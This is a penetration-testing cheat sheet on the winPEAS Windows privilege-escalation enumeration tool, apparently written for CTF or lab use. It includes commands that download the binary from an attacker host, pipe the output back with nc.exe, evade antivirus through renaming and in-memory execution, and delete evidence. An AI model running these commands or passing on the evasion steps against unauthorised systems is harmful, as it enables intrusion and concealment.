# winPEAS

**Tags:** `#winpeas` `#privesc` `#windows` `#enumeration` `#postexploit`

Windows Privilege Escalation Awesome Script. Automated enumeration of privesc vectors on Windows — checks service misconfigs, unquoted paths, AlwaysInstallElevated, weak permissions, token privileges, credential files, registry autoruns, and more. Color-coded: red/yellow = high priority.

**Source:** https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
**Install:** Download `.exe` or `.bat` from releases. Serve from Kali.

```cmd
winPEASx64.exe
```

> [!note]
> Red = high-probability privesc vector. Yellow = interesting. Run `winPEASx64.exe` on 64-bit systems, `winPEASx86.exe` on 32-bit. The `.bat` version works without .NET but has less coverage. AV will likely flag the binary — obfuscate or use in-memory execution.

---

## Delivery & Execution

```powershell
# Serve from Kali
python3 -m http.server 8000

# Download to target
certutil -urlcache -split -f http://10.10.14.5:8000/winPEASx64.exe C:\Temp\wp.exe
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5:8000/winPEASx64.exe','C:\Temp\wp.exe')

# Execute
C:\Temp\wp.exe

# Output to file (preserves color with -ansi)
C:\Temp\wp.exe | Out-File -Encoding ascii C:\Temp\winpeas_out.txt

# Pipe back to Kali via nc
C:\Temp\wp.exe | nc.exe 10.10.14.5 9001
```

---

## Execution Options

```cmd
# Full run (all checks)
winPEASx64.exe

# Specific category only
winPEASx64.exe systeminfo
winPEASx64.exe userinfo
winPEASx64.exe processinfo
winPEASx64.exe servicesinfo
winPEASx64.exe applicationsinfo
winPEASx64.exe networkinfo
winPEASx64.exe filesinfo

# Quiet (no banner/color)
winPEASx64.exe quiet

# Fast — skip slow checks
winPEASx64.exe fast
```

---

## What It Checks

| Category | Examples |
|----------|---------|
| System info | OS version, patches, env vars, WSL |
| Users | Local users, groups, logon sessions |
| Processes | Running as SYSTEM, interesting daemons |
| Services | Unquoted paths, weak permissions, modifiable binaries |
| Applications | Installed software versions |
| Scheduled tasks | Tasks with writable script paths |
| Registry | AlwaysInstallElevated, autorun keys, stored creds |
| Files | Credential files, SSH keys, .kdbx, SAM backups |
| Network | Open ports, firewall rules, shares |
| Token privileges | SeImpersonatePrivilege, SeDebugPrivilege |
| AV / EDR | Installed security products |

---

## High-Value Findings to Act On

```
# SeImpersonatePrivilege → Potato attacks (GodPotato, PrintSpoofer)
# AlwaysInstallElevated → Install MSI as SYSTEM
# Unquoted service path + writable dir → drop malicious binary
# Modifiable service binary → replace binary
# Stored credentials → registry, credential manager, config files
# SAM/SYSTEM backup → offline hash dump
```

---

## .bat Version (No .NET Required)

```cmd
# When .exe is blocked or .NET unavailable
winPEAS.bat

# Less comprehensive — no color, fewer checks
# Good fallback when binary AV detection is an issue
```

---

## OPSEC

- Well-known AV/EDR signature — rename binary before transfer
- Prefer in-memory execution via `execute-assembly` or PowerShell reflection
- Run targeted checks (Seatbelt, PowerUp) instead of full winPEAS on monitored hosts
- Clear evidence: delete binary and temp files after review

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
